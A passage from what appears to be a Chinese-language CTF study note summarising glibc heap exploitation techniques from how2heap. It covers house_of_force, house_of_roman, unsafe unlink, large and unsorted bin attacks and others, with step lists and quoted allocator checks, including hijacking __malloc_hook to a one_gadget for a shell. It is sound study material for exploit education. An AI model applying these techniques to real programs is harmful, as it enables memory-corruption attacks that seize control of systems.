list\");\n```\n\n这段代码意思就是下一个chunk，也就是BK，其fd不等于当前chunk地址，或者上一个chunk，也就是FD，其bk不等于当前chunk地址，满足其中一个就出错。\n\n(3)利用溢出漏洞，改掉chunk2的pre_size和pre_inuse，free掉chunk2,这样fakechunk+chunk2一起被放入bins中，形成chunkA\n\n(4)通过chunk1修改chunkA的fd,bk，使其指向想更改的地址addr\n\n(5)再malloc(sizeof(fakechunk+chunk2))就可以得到首地址为fakechunk，大小为fakechunk+chunk2的chunkA了。之后再malloc一次就得到addr的chunk\n\n \n\n6.house_of_force：通过修改topchunk的size域获得任意读写的chunk\n\n(1)修改topchunk的size域，使之变成一个大数。\n\n(2)malloc(-size)。要确保这个-size<topchunk.size(补码形式)\n\n(3)之后topchunk就会被抬升到-(size-0x10)的位置(chunk内存对齐的原因，具体调试一下就能判断被抬升到哪里了：p main_arena.top)然后才会从被抬升之后的topchunk开始分配size大小的chunk。\n\n(4)这时候再正常malloc，就可分配到从被抬升之后分配完size的topchunk地址处切割的chunk了，实现任意地址读写。\n\n \n\n7.house_of_lore：\n\n针对small bin进行攻击的，如果题目设置malloc大小限制大于fastbin时，就可以利用了。\n\n(1)分配一个small bin大小的chunk_ptr，和另一个chunk 用来间隔 top chunk。\n\n(2)在栈上伪造两个地址fake chunk1和fake chunk2，从smallbin中申请需要满足以下条件：\n\n①// 获取 small bin 中倒数第二个 chunk 。\n\nbck = victim->bk;\n\n▲需要设置chunk_ptr->bk = fake chunk1\n\n②// 检查 bck->fd 是不是 victim，防止伪造\n\n```\n#注释头\n\nif (__glibc_unlikely(bck->fd != victim)) {\n     errstr = \"malloc(): smallbin double linked list corrupted\";\n     goto errout;\n}\n```\n\n▲需要设置fake chunk1->fd = chunk_ptr，同时由于之后申请fake chunk1时也需要满足这个条件，所以也需要设置fake chunk2->fd = fake chunk1，fake chunk1->bk = fake chunk2\n\n(3)释放掉chunk_ptr，唯一需要漏洞利用的是设置victim->bk = fake chunk1，这里需要获取栈上的地址，并且存在类似UAF漏洞之类的来设置bk指针。设置之后现在smallbin链表中结构为fake chunk2->fake chunk1->chunk_ptr。\n\n(4)之后申请sizeof(chunk_ptr)，将之申请出来，再申请一次即可将fake chun1申请出来，实现任意地址申请堆块。\n\n▲注意这里针对smallbin的攻击是不需要设置size位的，不存在这方面的条件。\n\n \n\n8.house_of_orange：无free函数的泄露地址\n\n(1)修改topchunk的size域，使之变小，但需要满足下列条件：\n\n①伪造的 size 必须要对齐到内存页，例如topchunk_addr+topchunk_size=0x1000*x。\n\n②size 要大于 MINSIZE(0x10)\n\n③size 要小于之后申请的 chunk size + MINSIZE(0x10)\n\n④size 的 prev inuse 位必须为 1\n\n用于通过之后拓展topchunk的sysmalloc函数中的下列检查：\n\n```\n#注释头\n\nassert((old_top == initial_top(av) && old_size == 0) ||\n     ((unsigned long) (old_size) >= MINSIZE &&\n      prev_inuse(old_top) &&\n      ((unsigned long)old_end & pagemask) == 0));\n```\n\n(2)申请一个大于伪造之后topchunk_size，小于128K(0x1f400)的chunk。前者是为了调用sysmalloc函数，后者是为了使得分配方式为brk拓展topchunk。\n\n①brk是将数据段(.data)的最高地址指针_edata往高地址推，原先的topchunk被放入unsortedbin中，然后再从新的topchunk处开始分配。(一般会往高地址推0x21000这么大，基本就是再加一个初始topchunk大小)\n\n②mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存，这样原先的topchunk不会被放到unsortedbin中，那么再分配就是从这个mmap中分配，没办法泄露地址了。\n\n(3)再申请一块内存，就会从unsortedbin中的old_topchunk切割，得到的chunk的fd和bk都带有信息。如果程序没有将申请的chunk内存初始化，那么就可以泄露地址。另外由于在执行切割之前，old_topchunk会被先整理到smallbin或者largebin中(具体看old_chunk的size)，所以申请回来的chunk中的fd和bk的内容应该是对应smallbin或者largebin链表头的地址，不是unsortedbin链表头main_aren+88的地址。这里需要具体调试一下好计算偏移，方便泄露地址。\n\n \n\n9.house_of_roman：无leak的利用，爆破\n\n(1)申请3个chunk，chunkA,chunkB,chunkC,分别为0x20,0xd0,0x70.(A用来触发单字节溢出，修改chunkB的size位)\n\n(2)在chunkB+0x78处设置p64(0x61)，用来过检查用的。（6+7=13(0xd)）\n\n(3)释放chunkB , chunkB进入unsortedbin , 这样chunkB的fd和bk处都有 main_arena 的地址。\n\n(4)再次分配 0xd0 ,会分配到chunkB。以上步骤都是为了使得chunkB中带上main_arena的地址。\n\n(5)再申请三个0x70大小的chunk，chunkD,chunkE,chunkF，chunkF用来占位用，防止被topchunk吞并\n\n(6)释放掉chunkC,chunkD,使之进入fastbin中，为chunkD->chunkC。\n\n(7)利用UAF修改chunkD的fd的低字节，使其指向chunkB，即将0xf0修改为0x20即可：\n\n```\n#注释头\n\n0xn000 chunkA\n0xn020 chunkB\n0xn0f0 chunkC\n0xn160 chunkD\n0xn1d0 chunkE\n0xn240 chunkF\n```\n\n这里能够通过检查，因为前面将chunkB的size设置成了0x70，并且chunkB+0x78处也被设置成了0x61，所以可以通过fastbin的检查。伪造了一个0x70的chunk。那么0x70处的fastbin就变成chunkD->chunkB\n\n(8)修改chunkB的fd指针最后两个字节为\\xaa,\\xed使其指向malloc_hook - 0x23处。这里就需要用到爆破了，\\xaa中的第一个a是不确定的，有16种可能性。所以直接设置成a，成功概率应该为1/16。\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/图片1.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/图片2.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/图片3.png)\n\n而这里需要指向malloc_hook - 0x23的原因是因为既要包含__malloc_hook，又要使得这个chunk的size位为0x7f，观察内存可得，这是最优选择，选取的是_IO_wide_data_0+304这个数据中的7f，其它的7f都会带上其它的数据。\n\n(9)修改完chunkB的fd，就又成功伪造了一个0x70大小的chunk，那么0x70的fastbin中就变成：chunkD->chunkB->malloc_hook - 0x23\n\n(10)现在连续申请三次0x70大小的chunk，最后一个chunk就得到了malloc_hook - 0x23处的chunk，那么现在就可以计算偏移修改malloc+hook的值，修改最后三个字节，劫持为one_gadget。最后12位Bits可以通过固定偏移算出来，不会改变，但是前面的12位bits会改变，需要爆破。这里可以通过刚才的\\xaa中的a来减少爆破次数，\\xaa中第一个a已经确定，那么就可以通过偏移算出来随机化之后的one_gadget中的倒数第二个字节中的第一个16位数，这样就只需要爆破倒数第三个字节即可。那么总共需要的数学期望就应该是(0xff+1)*(0xf+1)=4096次。\n\n(11)爆破成功后还需要触发__malloc_hook，通过连续free两次同一个chunk，使得malloc检查到错误(主要会调用 __libc_message 来执行abort函数)。就可以触发malloc_printerr函数，从而调用__malloc_hook函数，进而getshell。\n\n \n\n10.house_of_spirit:\n\n(1)通过栈溢出修改栈上某个chunk指针，使其指向一个可控内存的栈地址，再修改该栈地址对应chunk的size位。\n\n(2)通过修改下一个chunk的size绕过检查，然后free掉该chunk指针，再申请回来，就可以控制中间区域的内容了。\n\nfakechunkA  uncontral_data  fakechunkB\n\n中心思想就是将不可控的内存纳入一个可控的Chunk中，从而实现可控。\n\n▲\n\n```\n#注释头\n\n//需要绕过的代码(_int_free函数)中：\nif (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)\n         || __builtin_expect (chunksize (chunk_at_offset (p, size))\n                 >= av->system_mem, 0))\n```\n\n即fakechunkA的nextchunk，也就是fakechunkA+fakechunkA->size = fakechunkB的size位满足大于2*SIZE_SZ（64位程序中SIZE_SZ为8），小于av->system_mem（在main_arena中，默认为128kb），一般简单设置后都能满足。\n\n \n\n11.large_bin_attack_1：任意可写地址写堆地址\n\n(1)申请三个chunk，chunkA,chunkB,chunkC,大小依次为0x80,0x400,0x400，其中还需要插入其它的chunk防止合并，然后free掉chunkB，使其进入unsortedbin。\n\nchunkA用来分割，chunkB和chunkC用来放入largebin中\n\n(2)申请一个小于chunkA的chunk，触发unsortedbin整理，将chunkB整理到largebin中。然后chunkA被分割成chunkA_1,chunkA_2，chunkA_1返回给用户，chunkA_2进入unsortedbin中。\n\n(3)free掉chunkC，使其进入unsortedbin中。\n\n(4)利用漏洞修改chunkB的size，使其小于0x410。\n\n(5)修改chunkB的bk为target_addr1-0x10，bk_nextsize为target_addr2_0x20。\n\n(6)分配一个比chunA_2小的chunk，再次触发整理，将chunkC整理至largebin中。\n\n(7)由于chunkB的size小于chunkC的size，所以会将chunkC插入largebin大小排列链表的头部，即以下代码：\n\n▲大小排列链表的代码赋值过程：\n\n```\n#注释头\n\nvictim->bk_nextsize = fwd->bk_nextsize;\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\n这里的victim就是chunkC，fwd就是chunkB，那么fwd->bk_nextsize就等于target_addr2-0x20。\n\n①第一行代码就是：\n\nchunkC->bk_nextsize被赋值为target_addr2-0x20\n\n②第二行代码就是：\n\n(target_addr2-0x20)->fd_nextsize被赋值为chunkC_addr，相当于\n\n*((target_addr2-0x20)+0x20)=chunkC_addr，即*(target_addr2)=chunC_addr\n\n▲释放顺序排列链表的代码赋值过程：\n\n```\n#注释头\n\nbck = fwd->bk;\n// ......\nmark_bin (av, victim_index);\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\n以上就相当于是*(target_addr1)=chunC_addr\n\n★综上所述，largebin attack的第一种利用方式就是将目的地址的值修改成一个堆地址。\n\n \n\n12.large_bin_attack_2：实现overlap chunk\n\n(1)申请四个chunk，chunkA,chunkB,chunkC,chunkD之后构造一个largebin大小排列的链表chunkA->chunkB，其中chunkA为0x420，chunkB为0x400，chunkC为0x400，未释放，chunkD用来占位防止合并。\n\n(2)利用漏洞将chunkB的bk_nextsize伪造指向chunkC，同时将C的fd与bk构造好，将C的fd_nextsize与bk_nextsize赋值为0。\n\n(3)当再次申请0x410大小的内存chunkE时，遍历chunkB->bk_nextsize会指向C，且C的大小满足需求，因此会调用unlink将chunkC从双链表取下，返回给用户。\n\n(4)那么申请出来的chunkE的地址会为chunkC的地址，即chunkE和chunkC为同一内存块，实现overlap chunk的构造。\n\n \n\n13.mmap_overlapping_chunks:暂时不好找\n\n \n\n14.overlapping_chunks:\n\n(1)free之前修改size，吞并邻块进入bin\n\n(2)free之后修改size，吞并邻块申请出来。\n\n \n\n15.poison_null_byte：实现overlap chunk\n\n(1)malloc三个chunk，chunkA,chunkB,chunkC。\n\n(2)利用漏洞，通过chunkB修改chunkC的pre_size位和pre_inuse位，使得chunkC的pre_size位为chunkA_size+chunkB_size。\n\n(3)free掉chunkC，此时chunkC的pre_inuse位为free状态，触发向上合并，将chunkA,chunkB,chunkC一起free掉。从而实现chunkB的overlap。\n\n但是ubuntu16.04打了补丁，需要绕过检查才行。\n\n \n\n16.unsafe_unlink：通常存储chunk的结构体全局指针来进行unlink攻击。\n\n(1)找到题目中的chunklist位置，并分清结构体中是size在前还是chunk在前。\n\n(2)这里假设我们想要控制chunklist[0]中的chunk。申请chunk0,chunk1,chunk2。在chunk0中构造fakechunk，并设置：\n\n```\n#注释头\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)通过堆溢出或者off-by-one将chunk1的pre_size设置成fakechunk_size，将chunk1的size设置成fakechunk_size+chunk1_size。\n\n(4)free掉chunk1，这样就会触发向上合并，将fakechunk和chunk1合并。同时，由于合并过程中调用了unlink函数，那么chunklist[0].chunk就会指向chunlist_addr-0x18，对应的就是我们的chunk0指向chunklist_addr-0x18。\n\n(5)现在修改chunk0就相当于修改*(chunklist_addr-0x18)，从而将chunk0指向任意地址，在任意地址实现读写。\n\n \n\n17.unsorted_bin_attack：任意地址写&main_arena+0x58\n\n(1)利用漏洞，修改处在unsortedbin中将要被拿出来的chunk的bk指针，使其指向traget-0x10\n\n(2)申请这个将要被拿出来的chunk，会有如下代码被运行：\n\n```\n#注释头\n\nbck = victim->bk;\n..................................................\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n\n①第一行代码中victim就是该chunk，那么bck就会指向traget_addr-0x10。\n\n②第四行代码就是将bck的值赋值给unsortedbin的bk指针，使其指向traget_addr-0x10。\n\n③第五行代码就是将unsortedbin的地址赋值给bck->fd，也就是*(target_addr-0x10+0x10)被赋值为unsortedbin的地址，即&main_arena+0x58。\n\n★综上，unsortedbin attack就是将任意地址处的值修改成&main_arena+0x58。\n\n▲一般unsortedbin attack是用来配合fastbin attack来使用的。因为fastbin attack需要伪造fakechunk的size，使其等于0x71或0x7f用来绕过检查.那么这时候就可以用到unsortedbin attack任意地址写&main_arena+0x58这个技巧了，可以使得fakechunk的size等于0x7f，从而绕过检查。\n\n \n\n18.unsorted_bin_into_stack：\n\n(1)利用漏洞，修改unsortedbin中位于链表尾部的chunk_last的bk指针使其指向栈上伪造的一个fakechunk，使其size不等于原先unsortedbin中chunk_last的size。\n\n(2)申请fakechunk的size大小的chunk，从unsortedbin链表尾部的chunk开始查找，首先chunk_last的size不符合，接着查找chunk_last->bk，也就是fakechunk，发现size符号，那么就返回该fakechunk给用户。\n\n这里的fakechunk就可以伪造到栈上，从而控制栈上原先不可控的内容。\n\n \n\n \n\n参考资料：\n\nctfwiki\n\nhttps://github.com/shellphish/how2heap\n\nhttps://bbs.pediy.com/thread-259269.htm#msg_header_h2_12\n","tags":["how2heap"],"categories":["PWN","how2heap"]}]